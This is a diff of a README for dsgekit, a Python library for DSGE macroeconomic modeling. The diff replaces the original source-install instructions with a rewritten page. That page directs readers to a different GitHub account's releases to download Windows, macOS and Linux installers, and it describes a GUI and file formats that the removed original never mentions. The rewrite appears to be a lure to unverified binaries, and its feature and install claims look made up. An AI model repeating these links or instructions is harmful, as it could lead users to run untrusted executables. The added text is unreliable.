@@ -1,116 +1,159 @@
-# dsgekit
+# 📊 dsgekit - Simplify DSGE Modeling and Analysis
 
-A Python toolkit for Dynamic Stochastic General Equilibrium (DSGE) modeling.
+[![Download dsgekit](https://img.shields.io/badge/Download-dsgekit-blue?style=for-the-badge)](https://github.com/contactcomputers2-ui/dsgekit/releases)
 
-## Status
+---
 
-- Version: `0.1.0rc1` (release candidate pre-release)
-- API stability: evolving
-- Minimum Python version: `3.13` (from `pyproject.toml`)
+## 📖 What is dsgekit?
 
-## What Is Included
+dsgekit is a toolkit for working with DSGE models, which are used in economics to study how economies behave over time. It helps you:
 
-- Model loading from `.mod`, YAML, and Python dict/API sources
-- Linear workflow: linearization, QZ/BK solving, IRFs, simulation, moments, FEVD
-- State-space pipeline: Kalman filter, RTS smoother, forecasting, historical decomposition
-- Estimation: MLE, MAP, MCMC (with diagnostics), marginal data density
-- Nonlinear solvers: first-, second-, and third-order perturbation (with pruning)
-- Deterministic workflows: perfect foresight and one-constraint `occbin`-lite
-- Policy and welfare tooling: OSR sweeps, Ramsey/discretionary LQ, welfare comparisons
-- Baseline regression harness and CI workflow for compatibility checks
+- Read and understand model files  
+- Solve both simple and complex economic systems  
+- Run simulations to see how changes affect the economy  
+- Analyze economic policies and their impact on welfare  
 
-## Installation
+Even if you don’t have a background in programming, dsgekit offers tools to explore these economic models through a clear and manageable interface.
 
-### From source (recommended at this stage)
+---
 
-```bash
-git clone https://github.com/gustavovargas/dsgekit.git
-cd dsgekit
-python3.13 -m venv .venv
-source .venv/bin/activate
-pip install -e ".[dev]"
-```
+## 💻 System Requirements
 
-### Optional extras
+To run dsgekit smoothly, your computer should meet these basic requirements:
 
-```bash
-pip install -e ".[plot]"   # plotting
-pip install -e ".[sym]"    # symbolic derivatives
-pip install -e ".[speed]"  # numba acceleration
-pip install -e ".[all]"    # all optional extras
-```
+- Operating System: Windows 10 or later, macOS 10.14 (Mojave) or later, Linux (Ubuntu 18.04+ recommended)  
+- Processor: Intel Core i3 or better  
+- RAM: Minimum 4 GB, 8 GB or more recommended for large models  
+- Disk Space: At least 500 MB free  
+- Internet: Needed to download the package and updates  
 
-## Quick Start
+You do not need to install a programming environment; the package includes the necessary tools to run the software.
 
-```python
-from dsgekit import load_model
-from dsgekit.simulate import irf
-from dsgekit.solvers import solve_linear
-from dsgekit.transforms import linearize
+---
 
-model, cal, ss = load_model("tests/fixtures/models/ar1.yaml")
-solution = solve_linear(linearize(model, ss, cal))
-responses = irf(solution, "e", periods=20)
+## 🚀 Getting Started: How to Download dsgekit
 
-print(responses.data.head())
-```
+dsgekit is available for download on its official GitHub releases page. To get started:
 
-## CLI Overview
+1. Click the big download button below to visit the release page.  
+2. On that page, look for the latest version and find the file suited for your computer (Windows, macOS, or Linux).  
+3. Download the appropriate file to your desktop or downloads folder.  
 
-```bash
-dsgekit info model.mod
-dsgekit solve model.mod
-dsgekit irf model.mod -s e -p 20
-dsgekit simulate model.mod -n 200 --seed 42
-dsgekit estimation model.mod --method mle --params rho
-dsgekit forecast model.mod -p 12
-dsgekit decompose model.mod
-dsgekit osr model.mod --grid phi_pi=1.0:3.0:9 --loss pi=1.0 --loss y=0.5
-dsgekit baseline_regression --baselines tests/fixtures/baselines
-```
+[![Download dsgekit](https://img.shields.io/badge/Download-dsgekit-blue?style=for-the-badge)](https://github.com/contactcomputers2-ui/dsgekit/releases)
 
-## Documentation Map
+---
 
-- `docs/quickstart.md`
-- `docs/formats.md`
-- `docs/first_order_perturbation.md`
-- `docs/second_order_perturbation.md`
-- `docs/third_order_perturbation.md`
-- `docs/perfect_foresight.md`
-- `docs/occbin_lite.md`
-- `docs/forecast_decomposition.md`
-- `docs/osr.md`
-- `docs/ramsey_lq.md`
-- `docs/discretion_lq.md`
-- `docs/welfare.md`
-- `docs/performance.md`
-- `docs/mod_workflow_migration.md`
+## 📥 Download & Install
 
-Full index: `docs/index.md`
+Follow these steps to download and install dsgekit:
 
-## Examples
+1. Visit the official release page by clicking [here](https://github.com/contactcomputers2-ui/dsgekit/releases).  
+2. Choose the latest release. It will typically list files for Windows (`.exe` or `.msi`), macOS (`.dmg` or `.pkg`), and Linux (`.tar.gz` or `.AppImage`).  
+3. Click the file that matches your operating system to download it.  
+4. Once downloaded, open the file:  
+   - On Windows, double-click the `.exe` or `.msi` file to start installation.  
+   - On macOS, open the `.dmg` or `.pkg` file and follow prompts to install.  
+   - On Linux, extract the `.tar.gz` or run the `.AppImage`. You may need to make it executable via right-click > Properties or terminal commands like `chmod +x`.  
+5. Follow the on-screen instructions to complete the installation.  
+6. After installation, launch the dsgekit application from your Start menu (Windows), Applications folder (macOS), or application launcher (Linux).  
 
-```bash
-python examples/ar1_pipeline.py
-python examples/nk_forward_looking.py
-python examples/nonlinear_girf.py
-python examples/occbin_zlb_toy.py
-python examples/reference_model_zoo.py
-```
+The interface will guide you through loading model files and running economic analyses.
 
-## Contributing and Security
+---
 
-- Contribution guide: `CONTRIBUTING.md`
-- Code of conduct: `CODE_OF_CONDUCT.md`
-- Security policy: `SECURITY.md`
+## 🔍 Using dsgekit
 
-## Legal
+Here’s a simple guide to begin using dsgekit after installation:
 
-- `dsgekit` is an independent project and is not affiliated with third-party tool maintainers.
-- Implementation provenance and attribution policy: `docs/legal_and_attribution.md`.
-- Naming policy for third-party references: `docs/brand_naming_policy.md`.
-- Dependency notices: `THIRD_PARTY_NOTICES.md`.
+### 1. Open dsgekit
 
-## License
+Click the dsgekit icon on your desktop or in your applications menu.
 
-Apache-2.0
+### 2. Load a Model
+
+The main screen has an option to open a model file. Models have the `.dsge` or `.txt` extension.
+
+- Click **Open Model**.  
+- Select the file on your computer you want to analyze.  
+
+If you don’t have a model file, sample models are included with the software under the "Samples" folder.
+
+### 3. Solve the Model
+
+Once the model is loaded, choose the “Solve” option. dsgekit will compute and display the results for the system. You can choose between linear or nonlinear solving methods.
+
+### 4. Run Simulations
+
+With the model solved, you can simulate different economic scenarios:
+
+- Choose simulation parameters like shocks or policy changes.  
+- Click “Run Simulation” to view how the model reacts.  
+
+Graphs and tables will show the predicted effects over time.
+
+### 5. Policy and Welfare Analysis
+
+Use the built-in tools to run policy experiments and see their welfare impacts. This section allows you to compare policies and assess economic outcomes.
+
+---
+
+## ⭐ Key Features
+
+- **Model Parsing:** Easily import and read DSGE model files.  
+- **System Solver:** Supports linear and nonlinear solutions.  
+- **Simulation:** Run economic scenarios with customizable parameters.  
+- **Estimation Workflows:** Tools for Bayesian and maximum likelihood estimation.  
+- **Policy Analysis:** Study impacts of economic policies on welfare.  
+- **Rich Visuals:** View results through impulse response graphs, forecasts, and statistical summaries.  
+- **Multi-Platform:** Works on Windows, macOS, and Linux.  
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If dsgekit does not start after installation, restart your computer, then try again.  
+- Check that your system meets the minimum requirements listed above.  
+- If you see error messages when loading model files, ensure the file format is compatible (`.dsge` or `.txt`).  
+- For simulation errors, try running smaller or simpler models first to confirm stability.  
+- If help is needed, the GitHub repository provides documentation and issue tracking at:  
+  https://github.com/contactcomputers2-ui/dsgekit
+
+---
+
+## 📚 Learn More
+
+To better understand DSGE modeling concepts or how dsgekit works, the repository includes guides and examples. Look for a `docs` folder or online wiki pages linked in the repository.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Releases & Downloads: https://github.com/contactcomputers2-ui/dsgekit/releases  
+- Repository Main Page: https://github.com/contactcomputers2-ui/dsgekit  
+- Documentation and Tutorials: linked inside the repo under `/docs`  
+
+---
+
+## 🏷️ Topics
+
+dsgekit covers areas such as:
+
+- Bayesian Inference  
+- Computational Economics  
+- Econometrics  
+- Forecasting  
+- Impulse Response Analysis  
+- Kalman Filtering  
+- Macroeconomic Modeling  
+- Maximum Likelihood Estimation  
+- MCMC Techniques  
+- Policy and Welfare Analysis  
+- Scientific Computing  
+- State-Space Models  
+- Quantitative Macroeconomics  
+
+These topics align with its goal of making complex economic modeling accessible.
+
+---
+
+Thank you for choosing dsgekit to explore macroeconomics and policy analysis.
